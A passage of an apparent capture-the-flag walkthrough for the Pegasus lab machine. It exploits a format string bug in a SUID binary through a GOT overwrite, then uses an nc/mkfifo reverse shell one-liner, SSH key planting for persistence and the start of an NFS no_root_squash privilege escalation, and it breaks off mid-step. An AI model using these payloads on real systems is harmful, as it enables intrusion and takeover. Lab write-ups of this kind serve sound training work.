+    <div>
+        <div><br /></div>
+    </div>
+    <div>Enter first number: 1</div>
+    <div>Enter second number: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</div>
+    <div>Error details: `�¿%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</div>
+    <div>Segmentation fault (core dumped)</div>
+</div>
+<div><br /></div>
+<div>Now that we know we can crash the program, we know we might can manipulate its execution to run arbitrary commands/shell code for us. Time to transfer the binary to our attacking machine and do some debugging/exploit generation.</div>
+<div><br /></div>
+<div>Running (and crashing) our program in gdb (with the pwndbg plugin loaded... see below for details), we get the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# gdb -q ./my_first</div>
+    <div>pwndbg: loaded 174 commands. Type pwndbg [filter] for a list.</div>
+    <div>pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</div>
+    <div>Reading symbols from ./my_first...(no debugging symbols found)...done.</div>
+    <div>pwndbg&gt; run</div>
+    <div>Starting program: /root/Walkthroughs/pegasus/my_first</div>
+    <div>WELCOME TO MY FIRST TEST PROGRAM</div>
+    <div>--------------------------------</div>
+    <div>Select your tool:</div>
+    <div>[1] Calculator</div>
+    <div>[2] String replay</div>
+    <div>[3] String reverse</div>
+    <div>[4] Exit</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: 1</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Enter first number: 1</div>
+    <div>Enter second number: %s%s</div>
+    <div>Error details: ����%s%s</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Program received signal SIGSEGV, Segmentation fault.</div>
+    <div>__strlen_ia32 () at ../sysdeps/i386/i586/strlen.S:51</div>
+    <div>51      ../sysdeps/i386/i586/strlen.S: No such file or directory.</div>
+    <div>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div>
+    <div>────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────</div>
+    <div> EAX  0xa</div>
+    <div> EBX  0xffffcf5c ◂— 0xb83eda00</div>
+    <div> ECX  0xf7e11162 (vfprintf+2514) ◂— cmp    byte ptr [ebp - 0x488], 0</div>
+    <div> EDX  0x2</div>
+    <div> EDI  0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d9d6c</div>
+    <div> ESI  0xf7fa0d80 (_IO_2_1_stdout_) ◂— 0xfbad2a84</div>
+    <div> EBP  0xffffcf78 —▸ 0xffffd038 —▸ 0xffffd068 ◂— 0x0</div>
+    <div> ESP  0xffffca5c —▸ 0xf7e12787 (vfprintf+8183) ◂— add    esp, 0x10</div>
+    <div>EIP  0xf7e6059f (__strlen_ia32+15) ◂— cmp    byte ptr [eax], dh</div>
+    <div>──────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────</div>
+    <div> ► 0xf7e6059f &lt;__strlen_ia32+15&gt;     cmp    byte ptr [eax], dh</div>
+    <div>   0xf7e605a1 &lt;__strlen_ia32+17&gt;     je     __strlen_ia32+182 &lt;0xf7e60646&gt;</div>
+    <div>    ↓   </div>
+    <div>   0xf7e60646 &lt;__strlen_ia32+182&gt;    sub    eax, dword ptr [esp + 4]</div>
+    <div>   0xf7e6064a &lt;__strlen_ia32+186&gt;    ret    </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>   0xf7e6064b                        nop    </div>
+    <div>   0xf7e6064d                        nop    </div>
+    <div>   0xf7e6064f                        nop    </div>
+    <div>   0xf7e60650 &lt;__stpcpy_ia32&gt;        push   edi</div>
+    <div>   0xf7e60651 &lt;__stpcpy_ia32+1&gt;      push   esi</div>
+    <div>   0xf7e60652 &lt;__stpcpy_ia32+2&gt;      push   ebx</div>
+    <div>   0xf7e60653 &lt;__stpcpy_ia32+3&gt;      mov    edi, dword ptr [esp + 0x10]</div>
+    <div>──────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────</div>
+    <div>00:0000│ esp  0xffffca5c —▸ 0xf7e12787 (vfprintf+8183) ◂— add    esp, 0x10</div>
+    <div>01:0004│      0xffffca60 ◂— 0xa /* '\n' */</div>
+    <div>02:0008│      0xffffca64 —▸ 0xffffcfc2 ◂— 0xa7325 /* '%s\n' */</div>
+    <div>03:000c│      0xffffca68 ◂— 0x0</div>
+    <div>... ↓   </div>
+    <div>────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────</div>
+    <div> ► f 0 f7e6059f __strlen_ia32+15</div>
+    <div>   f 1 f7e12787 vfprintf+8183</div>
+    <div>   f 2 f7e18c86 <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">printf</font>+38</div>
+    <div>   f 3  80486df calculator+196</div>
+    <div>   f 4  80485dc main+208</div>
+    <div>   f 5 f7de0b41 __libc_start_main+241</div>
+    <div>Program received signal SIGSEGV (fault address 0xa)</div>
+</div>
+<div><br /></div>
+<div>Checking the backtrace, we can see that the call to printf ultimately led to the crash. After some research and reading through these articles:</div>
+<div><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a></div>
+<div><a href="https://www.exploit-db.com/papers/13203" target="_blank">https://www.exploit-db.com/papers/13203</a></div>
+<div><a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf" target="_blank">http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a></div>
+<div><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" target="_blank">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></div>
+<div><br /></div>
+<div>I decided to try a GOT (Global Offset Table) overwrite attack.</div>
+<div><br /></div>
+<div>First, we need to find the address 'printf@plt' is jumping to.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>pwndbg&gt; disass 'printf@plt'</div>
+    <div>Dump of assembler code for function printf@plt:</div>
+    <div>   0x080483b0 &lt;+0&gt;:     jmp    DWORD PTR ds:<font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x8049bfc</font>
+    </div>
+    <div>   0x080483b6 &lt;+6&gt;:     push   0x0</div>
+    <div>   0x080483bb &lt;+11&gt;:    jmp    0x80483a0</div>
+    <div>End of assembler dump.</div>
+</div>
+<div><br /></div>
+<div>If we check the memory location for that pointer, then disassemble that...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>pwndbg&gt; x *<font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x8049bfc</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf7e18c60</font>:     0x0e5044e8
+    </div>
+    <div>pwndbg&gt; disass <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf7e18c60</font>
+    </div>
+    <div>Dump of assembler code for function __printf:</div>
+    <div>   0xf7e18c60 &lt;+0&gt;:     call   0xf7efdca9 &lt;__x86.get_pc_thunk.ax&gt;</div>
+    <div>   0xf7e18c65 &lt;+5&gt;:     add    eax,0x18739b</div>
+    <div>   0xf7e18c6a &lt;+10&gt;:    sub    esp,0xc</div>
+    <div>   0xf7e18c6d &lt;+13&gt;:    lea    edx,[esp+0x14]</div>
+    <div>   0xf7e18c71 &lt;+17&gt;:    sub    esp,0x4</div>
+    <div>   0xf7e18c74 &lt;+20&gt;:    push   edx</div>
+    <div>   0xf7e18c75 &lt;+21&gt;:    push   DWORD PTR [esp+0x18]</div>
+    <div>   0xf7e18c79 &lt;+25&gt;:    mov    eax,DWORD PTR [eax-0x78]</div>
+    <div>   0xf7e18c7f &lt;+31&gt;:    push   DWORD PTR [eax]</div>
+    <div>   0xf7e18c81 &lt;+33&gt;:    call   0xf7e10790 &lt;_IO_vfprintf_internal&gt;</div>
+    <div>   0xf7e18c86 &lt;+38&gt;:    add    esp,0x1c</div>
+    <div>   0xf7e18c89 &lt;+41&gt;:    ret    </div>
+    <div>End of assembler dump.</div>
+</div>
+<div><br /></div>
+<div>Now we need to do some tests to see how to crawl back the stack to the address we want to rewrite. We'll do this by giving some 'A's and then popping pointers off the stack until we are back to our 'A's.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>pwndbg&gt; run</div>
+    <div>Starting program: /root/Walkthroughs/pegasus/my_first </div>
+    <div>WELCOME TO MY FIRST TEST PROGRAM</div>
+    <div>--------------------------------</div>
+    <div>Select your tool:</div>
+    <div>[1] Calculator</div>
+    <div>[2] String replay</div>
+    <div>[3] String reverse</div>
+    <div>[4] Exit</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: 1</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Enter first number: 0</div>
+    <div>Enter second number: AAAA %p %p %p %p %p %p %p %p %p %p</div>
+    <div>Error details: AAAA 0xffffcfbc 0xa (nil) 0xf7fa05c0 0x1 (nil) 0xffffcfc0 <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x41414141</font> 0x20702520 0x25207025</div>
+</div>
+<div><br /></div>
+<div>Using this technique, we can see we had to pop 7 references off the stack to get back to our 'A's. So, to go directly to our 'A's, we could do this.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Enter first number: 0</div>
+    <div>Enter second number: AAAA%8$p         </div>
+    <div>Error details: AAAA0x41414141</div>
+</div>
+<div><br /></div>
+<div>Now, combining this with the %n format operator...</div>
+<div><br /></div>
+<div>From <a href="https://www.owasp.org/index.php/Format_string_attack" target="_blank">https://www.owasp.org/index.php/Format_string_attack</a></div>
+<div><img height="150" src="/assets/images/2019-05-06-pegasus-1/61B117D1-5977-48D1-9C1A-DD4B76002381.png" width="1138" /><br /></div>
+<div><br /></div>
+<div>From <a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" target="_blank">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></div>
+<div><span style="font-style: italic;">%n = The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</span></div>
+<div><br /></div>
+<div>To explain, if we were to pass the string AAAA%8$n, we would write the value 4 (the "number of characters") to the address 0x41414141 (that address comes from us looking down the stack 8 spots to our AAAA).</div>
+<div><br /></div>
+<div>For our exploit, we want to change the 'printf@plt' pointer to point to the system command (0xf7e04b40)...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>pwndbg&gt; print system</div>
+    <div>$1 = {int (const char *)} <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf7e04b40</font> &lt;__libc_system&gt;</div>
+</div>
+<div><br /></div>
+<div>... instead of the printf command (0xf7e18c60).</div>
+<div><br /></div>
+<div>To do that, we need to write 0xf7e04b40 to the address 0x8049bfc. Using a combination of our printf exploit techniques, here's what we want to send...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%19256x%8$hn%44192x%9$hn</div>
+</div>
+<div><br /></div>
+<div>This breaks down to...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>\xfc\x9b\x04\x08  (location for first two bytes/higher bytes, 0x8049bfc, reversed for little endian)</div>
+    <div>\xfe\x9b\x04\x08  (location for second two bytes/lower two bytes, 0x8049bfe, reversed for little endian)</div>
+    <div>%19256x           (generate our decimal value for %n, 0x4b40 = 19264 - 8)</div>
+    <div>%8$hn             (write higher two bytes to first location, 8 moves down the stack)</div>
+    <div>%44192x           (generate our decimal value for %n, 0xf7e0 = 63456 - 19264)</div>
+    <div>%9$hn             (write lower two bytes to second location, 9 moves down the stack)</div>
+</div>
+<div><br /></div>
+<div>So, sending our "printf -&gt; system" rewrite results in the following.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# python -c 'print "1\n0\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%19256x%8$hn%44192x%9$hn"' | ./my_first</div>
+    <div>WELCOME TO MY FIRST TEST PROGRAM  </div>
+    <div>--------------------------------  </div>
+    <div>Select your tool:</div>
+    <div>[1] Calculator</div>
+    <div>[2] String replay</div>
+    <div>[3] String reverse</div>
+    <div>[4] Exit</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Selection:</div>
+    <div>Enter first number: Enter second number: Error details: �</div>
+    <div><br /></div>
+    <div>&lt;lots of blank space&gt;</div>
+    <div><br /></div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">sh: 1: Selection:: not found</font>
+    </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Bye!</div>
+</div>
+<div><br /></div>
+<div>We successfully overwrote 'printf@plt' when the program tried to print what we entered into the calculator, so the next time the program tries to call printf (to ask for a new selection), it is actually passing that string to system instead of printf. 😄 Since there isn't a program in the $PATH called 'Selection:', the system call fails... but we can fix that.</div>
+<div><br /></div>
+<div>Now that we basically know what we are dealing with, we can move over to the victim and execute arbitrary system commands as 'john' (the SUID user of my_first).</div>
+<div><br /></div>
+<div>Before we can run our exploit on the victim, we need to disable ASLR (using ulimit) and then check the address for 'system' on the victim. We'll do this by running gdb on the victim, crashing the program and running 'print system'.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:~$ ulimit -s unlimited</div>
+    <div>mike@pegasus:~$ gdb -q my_first</div>
+    <div>Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.</div>
+    <div>(gdb) run</div>
+    <div>Starting program: /home/mike/my_first </div>
+    <div>WELCOME TO MY FIRST TEST PROGRAM</div>
+    <div>--------------------------------</div>
+    <div>Select your tool:</div>
+    <div>[1] Calculator</div>
+    <div>[2] String replay</div>
+    <div>[3] String reverse</div>
+    <div>[4] Exit</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Selection: 1</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Enter first number: 0</div>
+    <div>Enter second number: %s%s</div>
+    <div>Error details: @���%s%s</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Program received signal SIGSEGV, Segmentation fault.</div>
+    <div>0x4006ea59 in vfprintf () from /lib/i386-linux-gnu/libc.so.6</div>
+    <div>(gdb) p system</div>
+    <div>$1 = {&lt;text variable, no debug info&gt;} <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x40069060</font> &lt;system&gt;</div>
+</div>
+<div><br /></div>
+<div>We need to adjust our exploit string to overwrite printf with 0x40069060. Redoing our calculations...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>\xfc\x9b\x04\x08  (location for first two bytes/higher bytes, 0x8049bfc, reversed for little endian)</div>
+    <div>\xfe\x9b\x04\x08  (location for second two bytes/lower two bytes, 0x8049bfe, reversed for little endian)</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">%36952x           (generate our decimal value for %n, 0x9060 = 36960 - 8)</font>
+    </div>
+    <div>%8$hn             (write higher two bytes to first location, 8 moves down the stack)</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">%44966x           (generate our decimal value for %n, 0x14006 = 81926 - 36960) # we added a 1 in front of our address so our value wouldn't be negative</font>
+    </div>
+    <div>%9$hn             (write lower two bytes to second location, 9 moves down the stack)</div>
+</div>
+<div><br /></div>
+<div>Running the program with our updated exploit string, I confirmed the system command is being called and "Selection:" is being passed in. All that's left to do now is create our reverse shell script, name it "Selection:", and add the current directory to our PATH.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pegasus:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5434 &gt;/tmp/f" &gt; Selection\:</div>
+    <div>mike@pegasus:~$ chmod +x Selection\: </div>
+    <div>mike@pegasus:~$ export PATH=.:$PATH</div>
+    <div>mike@pegasus:~$ python -c 'print "1\n0\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%36952x%8$hn%44966x%9$hn"' | ./my_first</div>
+</div>
+<div><br /></div>
+<div>When we pass our malicious printf string to the program, we get a new shell session in Metasploit as (effective user) john...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 10 opened (10.183.0.222:5434 -&gt; 10.183.0.210:34936) at 2019-05-07 17:53:53 -0400</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>msf5 exploit(multi/handler) &gt; sessions 10</div>
+    <div>[*] Starting interaction with 10...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>pwd</div>
+    <div>/home/mike</div>
+    <div>$ id</div>
+    <div>uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)</div>
+</div>
+<div><br /></div>
+<div>From here, we can add our SSH keys to /home/john/.ssh/authorized_keys and SSH in as john.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>$ cd /home/john/.ssh</div>
+    <div>$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKy7yNAa7Fw0mpUBX001tM69yRSjEgFvirEj9b0lsgSrHq2/qqqXFxN7JUaWn3pcwq8BoBgTAMeNQUzbO/Ph5qh1LmsHD6l3j6Vrs7OiUtnvFIbRIv35Rm+8a0fW3tU3+vxH3gVX+EyfG6QanPBfoAz1Gl6ZkPIdzw1CDiTUAWGvOOiBmOzay4aXOzNv+1S5FyjaxTUv6YZDMCq22MI6k2cZz76uUNQbupKhqvfucJecImu3eaWqRxuBLVBXlrMFqIwGEVIzqt/xRNfg61Krf//Qxi7tjv7okSin5MPu37+JIH0b3fKmuBQKJ2UersPwjVV+rgn02F2xSbvogIYbB7 root@kali" &gt;&gt; authorized_keys</div>
+    <div>$ chmod 600 authorized_keys</div>
+</div>
+<div><br /></div>
+<div>Then, from our attacking machine...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pegasus# ssh -i pegasus john@10.183.0.210</div>
+    <div>Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div> * Documentation:  https://help.ubuntu.com/</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  System information as of Wed May  8 08:06:30 AEST 2019</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  System load:  0.0               Processes:           100</div>
+    <div>  Usage of /:   8.5% of 18.32GB   Users logged in:     2</div>
+    <div>  Memory usage: 17%               IP address for eth0: 10.183.0.210</div>
+    <div>  Swap usage:   0%</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>  Graph this data and manage this system at:</div>
+    <div>    https://landscape.canonical.com/</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>150 packages can be updated.</div>
+    <div>124 updates are security updates.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>New release '14.04.6 LTS' available.</div>
+    <div>Run 'do-release-upgrade' to upgrade to it.</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>Your Hardware Enablement Stack (HWE) is supported until April 2017.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Last login: Wed May  8 08:00:51 2019 from kali.homenet.dom</div>
+    <div>john@pegasus:~$</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">pwndbg</span></div>
+<div><br /></div>
+<div>While working on exploiting the 'my_first' binary, I came across the GDB plug-in pwndbg. Apparently it is a more modern implementation of many of the features of peda (refer to IMF notes on peda).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>git clone https://github.com/pwndbg/pwndbg</div>
+    <div>cd pwndbg</div>
+    <div>./setup.sh</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Escalating from john's account</span></div>
+<div><br /></div>
+<div>We were able to get root pretty easily with the overlays exploit. Here's how we could have gotten root after moving from mike to john's account.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>john@pegasus:~$ sudo -l</div>
+    <div>Matching Defaults entries for john on this host:</div>
+    <div>    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>User john may run the following commands on this host:</div>
+    <div>    (root) NOPASSWD: /usr/local/sbin/nfs</div>
+</div>
+<div><br /></div>
+<div>The user john has the ability to start the nfs service without requiring a password. The user doesn't have permission to edit /etc/exports...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>john@pegasus:~$ ls -l /etc/exports</div>
+    <div>-rw-r--r-- 1 root root 450 Nov 18  2014 /etc/exports</div>
+</div>
+<div><br /></div>
+<div>...but the file's configuration is already vulnerable (it does not root_squash), so we should be good to go.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>john@pegasus:~$ cat /etc/exports</div>
+    <div># /etc/exports: the access control list for filesystems which may be exported</div>
+    <div>#               to NFS clients.  See exports(5).</div>
+    <div>#</div>
+    <div># Example for NFSv2 and NFSv3:</div>
+    <div># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</div>
+    <div>#</div>
+    <div># Example for NFSv4:</div>
+    <div># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</div>
+    <div># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</div>
+    <div>#</div>
+    <div>/opt/nfs        *(rw,sync,crossmnt,no_subtree_check,no_root_squash)</div>
+</div>
+<div><br /></div>
+<div>We'll go ahead and start the nfs service...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>john@pegasus:~$ sudo /usr/local/sbin/nfs start </div>
+    <div> * Exporting directories for NFS kernel daemon...</div>
+    <div>   ...done.</div>
+    <div> * Starting NFS kernel daemon</div>
+    <div>   ...done.</div>
+    <div>john@pegasus:~$ showmount -e</div>
+    <div>Export list for pegasus:</div>
+    <div>/opt/nfs *</div>
+</div>
+<div><br /></div>
+<div>Interestingly, the /opt/nfs can't be written to except by root...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>drwxr-xr-x 2 root root 4096 Nov 18  2014 nfs</div>
+</div>
+<div><br /></div>
+<div>...so we'll mount the share on our attacking machine where we are root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
